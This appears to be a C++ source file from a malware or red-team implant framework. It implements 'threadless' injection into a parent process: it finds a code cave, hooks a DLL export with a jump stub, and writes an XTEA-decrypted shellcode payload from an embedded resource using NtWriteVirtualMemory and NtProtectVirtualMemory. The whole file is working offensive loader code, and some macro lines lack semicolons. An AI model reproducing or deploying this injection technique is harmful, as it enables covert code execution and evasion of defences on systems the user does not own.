#include <inject/injectlib/injectlib.hpp>

namespace Injection {
    TXT_SECTION(F) BYTE Config[256] = { };

    VOID Entrypoint(HMODULE Base) {
        Memory::ContextInit();
        Threadless(Base);
    }

    VOID Threadless(HMODULE Base) {

        HEXANE
        THREADLESS Threadless = { };
        PARSER Parser       = { };
        LPVOID Shellcode    = { };
        HANDLE Proc         = { };
        ORSRC Rsrc          = { };

        ULONG Protect       = 0;
        UINT_PTR pExport    = 0;
        UINT_PTR exportCpy  = 0;
        UINT_PTR pHook      = 0;

        SIZE_T Read, Write  = 0;
        SIZE_T cbShellcode  = 0;

        __debugbreak();

        Memory::ResolveApi();
        Parser::CreateParser(&Parser, Config, sizeof(Config));
        x_memset(Config, 0, sizeof(Config));

        //XteaCrypt(B_PTR(Parser.Handle), Parser.Length, Ctx->ConfigBytes.Key, FALSE);

        Parser::ParserStrcpy(&Parser, CREINTERPRET(LPSTR*, &Ctx->Config.Key), nullptr);
        Parser::ParserMemcpy(&Parser, CREINTERPRET(PBYTE*, &Ctx->Root), nullptr);
        Parser::ParserMemcpy(&Parser, CREINTERPRET(PBYTE*, &Ctx->LE), nullptr);

        Parser::ParserStrcpy(&Parser, &Threadless.Parent.Buffer, &Threadless.Parent.Length);
        Parser::ParserStrcpy(&Parser, &Threadless.Module.Buffer, &Threadless.Module.Length);
        Parser::ParserStrcpy(&Parser, &Threadless.Export.Buffer, &Threadless.Export.Length);
        Parser::ParserStrcpy(&Parser, &Threadless.Opcode.Buffer, &Threadless.Opcode.Length);
        Parser::ParserStrcpy(&Parser, &Threadless.Loader.Buffer, &Threadless.Loader.Length);

        Parser::DestroyParser(&Parser);

        if (
            !(pExport = Memory::LdrGetExport(CREINTERPRET(PBYTE, Threadless.Module.Buffer), CREINTERPRET(PBYTE, Threadless.Export.Buffer))) ||
            !(Rsrc = Memory::LdrGetIntResource(Base, IDR_RSRC_BIN1))) {
            return;
        }

        Shellcode = Ctx->Nt.RtlAllocateHeap(LocalHeap, 0, Rsrc->Size);
        cbShellcode = Threadless.Loader.Length + Rsrc->Size;

        MmPatchData(i, CREINTERPRET(PBYTE, Shellcode), (i), CREINTERPRET(PBYTE, Rsrc->ResLock), (i), Rsrc->Size);
        Ctx->win32.FreeResource(Rsrc->hGlobal);

        if (
            !(Proc = Process::LdrGetParentHandle(CREINTERPRET(PBYTE, Threadless.Parent.Buffer))) ||
            !(pHook = Memory::MmCaveHunter(Proc, pExport, cbShellcode))) {
            return;
        }

        auto LoaderRva = pHook - (pExport + 5);
        auto hookCpy = pHook;

        MmPatchData(i, CREINTERPRET(PBYTE, &exportCpy), (i), CREINTERPRET(PBYTE, &pExport), (i), sizeof(LPVOID))
        MmPatchData(i, Threadless.Loader.Buffer, (0x12 + i), CREINTERPRET(PBYTE, &exportCpy), (i), sizeof(LPVOID))
        MmPatchData(i, Threadless.Opcode.Buffer, (0x01 + i), CREINTERPRET(PBYTE, &LoaderRva), (i), 4)

        if (
            !NT_SUCCESS(Ctx->Nt.NtProtectVirtualMemory(Proc, CREINTERPRET(PVOID*, &exportCpy), &cbShellcode, PAGE_EXECUTE_READWRITE, &Protect)) ||
            !NT_SUCCESS(Ctx->Nt.NtWriteVirtualMemory(Proc, CREINTERPRET(PVOID, pExport), CREINTERPRET(PVOID, Threadless.Opcode.Buffer), Threadless.Opcode.Length, &Write))
            || Write != Threadless.Opcode.Length) {
            return;
        }

        cbShellcode = Threadless.Loader.Length + Rsrc->Size;

        if (
            !NT_SUCCESS(Ctx->Nt.NtProtectVirtualMemory(Proc, CREINTERPRET(LPVOID*, &hookCpy), &cbShellcode, PAGE_READWRITE, &Protect)) ||
            !NT_SUCCESS(Ctx->Nt.NtWriteVirtualMemory(Proc, C_PTR(pHook), Threadless.Loader.Buffer, Threadless.Loader.Length, &Write)) ||
            Write != Threadless.Loader.Length) {
            return;
        }

        Xtea::XteaCrypt(CREINTERPRET(PBYTE, Shellcode), Rsrc->Size, Ctx->Config.Key, FALSE);

        if (
            !NT_SUCCESS(Ctx->Nt.NtWriteVirtualMemory(Proc, C_PTR(pHook + Threadless.Loader.Length), Shellcode, Rsrc->Size, &Write)) || Write != Rsrc->Size ||
            !NT_SUCCESS(Ctx->Nt.NtProtectVirtualMemory(Proc, CREINTERPRET(LPVOID*, &pHook), &cbShellcode, Protect, &Protect))) {
            return;
        }

        if (Proc) {
            Ctx->Nt.NtClose(Proc);
        }
        if (Shellcode) {
            x_memset(Shellcode, 0, Rsrc->Size);
        }

        Parser::DestroyParser(&Parser);
        Execute();
    }
}
